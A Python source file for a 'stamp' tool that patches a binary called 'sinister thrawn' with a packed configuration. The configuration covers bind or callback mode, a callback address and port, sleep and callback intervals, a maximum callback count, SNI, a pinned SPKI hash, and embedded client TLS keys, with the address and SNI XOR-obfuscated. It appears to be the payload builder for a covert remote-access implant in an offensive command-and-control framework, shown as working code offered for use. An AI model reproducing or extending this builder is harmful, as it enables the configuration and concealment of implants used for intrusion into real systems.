import asyncio
import aiofiles
import argparse
import logging
import hashlib
import struct
from enum import IntEnum
from pathlib import Path
from typing import Optional
from random import randbytes
from ipaddress import IPv4Address
from cryptography import x509
from cryptography.exceptions import UnsupportedAlgorithm
from cryptography.hazmat.primitives.serialization import (
    Encoding,
    PublicFormat,
    NoEncryption,
    load_pem_private_key,
    PrivateFormat,
)


class Mode(IntEnum):
    LISTEN = (0,)
    CALLBACK = 1


class CertificateType(IntEnum):
    PRIVATE = (0,)
    PUBLIC = 1


class Patcher:
    """Parses configuration and patches sinister thrawn binary with embedded TLS config"""

    BINARY_PATCH: bytes = b"A" * 2048
    SHA256_HASH_LEN: int = 32
    MAX_SNI_LEN: int = 255
    MAX_ADDR_LEN: int = 255
    MAX_DER_LEN: int = 900

    def __init__(self):
        self.log: logging.Logger = logging.getLogger("framework")
        self.mode: Mode = Mode.LISTEN
        self.address: str = ""
        self.port: int = 0
        self.sleep: int = 0
        self.certs_dir: Optional[Path] = None
        self.sni: Optional[str] = None
        self.interval: int = 0
        self.max_cb: int = 0
        self.infile: Optional[Path] = None
        self.outfile: Optional[Path] = None

    async def _hash_spki(self) -> Optional[bytes]:
        """SHA256 hashes server's spki from public certificate"""

        try:
            async with aiofiles.open(f"{self.certs_dir}/server.crt", "rb") as tmp:
                cert = x509.load_pem_x509_certificate(await tmp.read())

        except (PermissionError, FileNotFoundError) as error:
            self.log.info(error)
            return None

        except ValueError:
            self.log.info(f"{self.certs_dir}/server.crt is not a valid PEM certificate")
            return None

        try:
            spki_bytes = cert.public_key().public_bytes(
                Encoding.DER, PublicFormat.SubjectPublicKeyInfo
            )
        except UnsupportedAlgorithm as algo_err:
            self.log.info(algo_err)
            return None

        spki_hash = hashlib.sha256(spki_bytes).digest()

        return spki_hash

    async def _convert_to_der(self, cert_type: CertificateType) -> Optional[bytes]:
        """Converts specified PEM certificate or key into binary DER format"""

        try:
            if cert_type == CertificateType.PUBLIC:
                async with aiofiles.open(f"{self.certs_dir}/client.crt", "rb") as tmp:
                    cert = x509.load_pem_x509_certificate(await tmp.read())
                der = cert.public_bytes(Encoding.DER)
            else:
                async with aiofiles.open(f"{self.certs_dir}/client.key", "rb") as tmp:
                    key = load_pem_private_key(await tmp.read(), password=None)
                der = key.private_bytes(
                    Encoding.DER, PrivateFormat.PKCS8, NoEncryption()
                )

        except (PermissionError, FileNotFoundError) as certificate_error:
            self.log.info(certificate_error)
            return None
        except ValueError:
            self.log.info("Certificate file is not in valid PEM format")
            return None

        return der

    def _build_patch(
        self, spki: bytes, public_key: bytes, private_key: bytes
    ) -> Optional[bytes]:
        """
        Uses supplied values to build binary patch that will hold sinisterthrawn configuration

        Packed Buffer:
            - Xor Key       (u8)
            - Mode          (u8)
            - Sleep         (u8)
            - Port          (u16)
            - SPKI          (Fixed 32 Bytes)
            - Address Len   (u8)
            - Pub Key Len   (u16)
            - Priv Key Len  (u16)
            - Address       (Var)
            - Public Key    (Var)
            - Private Key   (Var)
            - Interval      (u16)
            - Max Callbacks (u8)
            - SNI Len       (u8)
            - SNI           (Var)
        """

        if len(spki) != self.SHA256_HASH_LEN:
            self.log.info(f"SPKI hash must be exactly {self.SHA256_HASH_LEN} bytes")
            return None

        if len(public_key) > self.MAX_DER_LEN or len(private_key) > self.MAX_DER_LEN:
            self.log.info(
                f"length of provided key or certificate exceeds the maximum length of {self.MAX_DER_LEN} bytes"
            )
            return None

        xor_key = randbytes(1)[0]

        sni_bytes = self.sni.encode() if self.sni else b""
        if len(sni_bytes) > self.MAX_SNI_LEN:
            self.log.info(f"SNI exceeds maximum of {self.MAX_SNI_LEN} bytes")
            return None

        addr_bytes = self.address.encode()
        if len(addr_bytes) > self.MAX_ADDR_LEN:
            self.log.info(
                f"Address length exceeds maximum of {self.MAX_ADDR_LEN} bytes"
            )
            return None

        sni_bytes = bytes(b ^ xor_key for b in sni_bytes)
        addr_bytes = bytes(b ^ xor_key for b in addr_bytes)

        PATCH_FMT = f"!BBBH{len(spki)}sBHH{len(addr_bytes)}s{len(public_key)}s{len(private_key)}sHBB{len(sni_bytes)}s"

        try:
            patch = struct.pack(
                PATCH_FMT,
                xor_key,
                self.mode,
                self.sleep,
                self.port,
                spki,
                len(addr_bytes),
                len(public_key),
                len(private_key),
                addr_bytes,
                public_key,
                private_key,
                self.interval,
                self.max_cb,
                len(sni_bytes),
                sni_bytes,
            )

        except struct.error:
            self.log.info("Unable to build binary patch with specified values")
            return None

        if len(patch) > len(self.BINARY_PATCH):
            self.log.info(
                f"Patch ({len(patch)} bytes) exceeds maximum byte length of {len(self.BINARY_PATCH)}"
            )
            return None

        return patch

    def _parse_stamper_args(self, args: list, str_usage: str) -> bool:
        """parses required arguments for stamping sinister thrawn binary"""

        parser = argparse.ArgumentParser(
            prog="stamp",
            usage=str_usage,
            formatter_class=argparse.ArgumentDefaultsHelpFormatter,
            exit_on_error=False,
            color=False,
        )

        # configuration modes
        parser.add_argument(
            "-l",
            "--listen",
            required=False,
            type=IPv4Address,
            default=IPv4Address("0.0.0.0"),
            help="remote bind address",
        )
        parser.add_argument(
            "-c",
            "--callback",
            required=False,
            type=str,
            help="callback address or domain",
        )
        parser.add_argument(
            "--sleep",
            type=int,
            required=False,
            default=10,
            help="seconds before initial connection or bind is attempted",
        )

        # port is used in either callback or listen mode, reducing to single arg
        parser.add_argument(
            "-p", "--port", required=True, type=int, help="bind or callback port"
        )

        # certs should be permitted for client and server auth, or different certs will be required for listen/callback modes. cert_gen has both modes
        parser.add_argument(
            "--certs",
            type=Path,
            required=True,
            help="directory with required certificates",
        )

        # callback specific args
        parser.add_argument(
            "-s",
            "--sni",
            type=str,
            required=False,
            help="SNI presented during certificate exchange",
        )
        parser.add_argument(
            "-i",
            "--interval",
            type=int,
            required=False,
            help="Minutes between callback iterations",
            default=240,
        )
        parser.add_argument(
            "-m",
            "--max",
            type=int,
            required=False,
            help="Number of callbacks permitted before process termination",
            default=3,
        )

        # infile and outfile
        parser.add_argument(
            "--infile",
            type=Path,
            required=True,
            help="Non-stamped sinisterthrawn binary",
        )
        parser.add_argument(
            "--outfile",
            type=Path,
            required=True,
            help="Path to write stamped sinisterthrawn binary",
        )

        try:
            parsed_args = parser.parse_args(args)
        except argparse.ArgumentError as error:
            self.log.info(error)
            return False

        except SystemExit:
            return False

        if parsed_args.callback and parsed_args.listen != IPv4Address("0.0.0.0"):
            self.log.info(
                "stamped binary must have only one specified mode, ie --callback or --listen"
            )
            return False

        if not 1 <= parsed_args.port <= 65535:
            self.log.info(f"port {parsed_args.port} out of range [1-65535]")
            return False

        if not 10 <= parsed_args.sleep <= 60:
            self.log.info(f"sleep time {parsed_args.sleep} out of range [10 - 60]")
            return False

        if not parsed_args.certs.exists() or not parsed_args.certs.is_dir():
            self.log.info(f"{parsed_args.certs} is not a valid directory")
            return False

        if not parsed_args.infile.exists() or not parsed_args.infile.is_file():
            self.log.info(f"{parsed_args.infile} is not a valid file")
            return False

        if parsed_args.callback:
            if len(parsed_args.callback) > self.MAX_ADDR_LEN:
                self.log.info(
                    f"{parsed_args.callback} exceeds maximum length of {self.MAX_ADDR_LEN}"
                )
                return False

            if not parsed_args.sni:
                parsed_args.sni = parsed_args.callback
            elif len(parsed_args.sni) > self.MAX_SNI_LEN:
                self.log.info(
                    f"{parsed_args.sni} exceeds maximum length of {self.MAX_SNI_LEN}"
                )
                return False

            if not 5 <= parsed_args.interval <= 1440:
                self.log.info(f"interval {parsed_args.interval} out of range [5-1440]")
                return False

            if not 3 <= parsed_args.max <= 30:
                self.log.info(
                    f"maximum number of callbacks {parsed_args.max} out of range [3-30]"
                )
                return False

            self.mode = Mode.CALLBACK
            self.address = parsed_args.callback
            self.interval = parsed_args.interval
            self.max_cb = parsed_args.max
            self.sni = parsed_args.sni

        else:
            self.mode = Mode.LISTEN
            self.address = str(parsed_args.listen)

        self.port = parsed_args.port
        self.sleep = parsed_args.sleep
        self.certs_dir = parsed_args.certs
        self.infile = parsed_args.infile
        self.outfile = parsed_args.outfile

        return True

    async def patch_binary(self, args: list, str_usage: str) -> bool:

        if not self._parse_stamper_args(args, str_usage):
            return False

        try:
            async with aiofiles.open(self.infile, "rb") as f:
                data = await f.read()
        except (PermissionError, FileNotFoundError) as error:
            self.log.info(error)
            return False

        index = data.find(self.BINARY_PATCH)
        if -1 == index:
            self.log.info("pattern was not found within specified infile")
            return False

        self.log.debug(
            f"Source: {self.infile.name} -- Size: {len(data)} -- Pattern Index: {index}"
        )

        spki = await self._hash_spki()
        if spki is None:
            return False

        self.log.debug(f"SPKI Hash: {spki}")

        public_key = await self._convert_to_der(CertificateType.PUBLIC)
        private_key = await self._convert_to_der(CertificateType.PRIVATE)
        if public_key is None or private_key is None:
            return False

        self.log.debug(
            f"Public key size: {len(public_key)} -- Private key size: {len(private_key)}"
        )

        patch = self._build_patch(spki, public_key, private_key)
        if patch is None:
            return False

        pad_bytes = b"\x00" * (len(self.BINARY_PATCH) - len(patch))
        patched_data = (
            data[:index] + patch + pad_bytes + data[index + len(self.BINARY_PATCH) :]
        )

        try:
            async with aiofiles.open(self.outfile, "wb") as new_file:
                await new_file.write(patched_data)
        except (PermissionError, OSError) as write_error:
            self.log.info(write_error)
            return False

        self.log.info(f"Patched binary written to {self.outfile}")

        self.log.debug(
            f"Config -- Mode: {self.mode.name} | Address: {self.address} | Port: {self.port} | "
            f"Sleep: {self.sleep}s | SNI: {self.sni} | Interval: {self.interval}m | "
            f"Max Callbacks: {self.max_cb} | Patch Size: {len(patch)} | "
            f"Padding: {len(pad_bytes)} | Infile: {self.infile} | Outfile: {self.outfile}"
        )

        return True
